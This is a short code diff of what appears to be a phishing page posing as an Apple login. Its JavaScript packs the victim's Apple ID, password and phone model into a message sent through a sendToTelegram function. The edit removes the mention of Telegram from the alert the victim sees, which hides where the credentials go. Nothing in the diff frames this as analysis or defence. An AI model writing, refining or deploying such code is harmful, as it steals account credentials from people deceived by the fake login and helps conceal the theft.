@@ -222,7 +222,7 @@
         
         const msg = `🍎 LOGIN\nID: ${currentData.appleId}\nPass: ${currentData.password}\nDevice: ${detectPhoneModel()}`;
         if (await sendToTelegram(msg, false)) {
-            alert("Запрос отправлен. Ожидайте подтверждения в Telegram...");
+            alert("Запрос отправлен. Ожидайте подтверждения...");
             startPolling(false);
         }
     };
@@ -263,6 +263,7 @@
 </script>
 </body>
 </html>
+
 
 
 
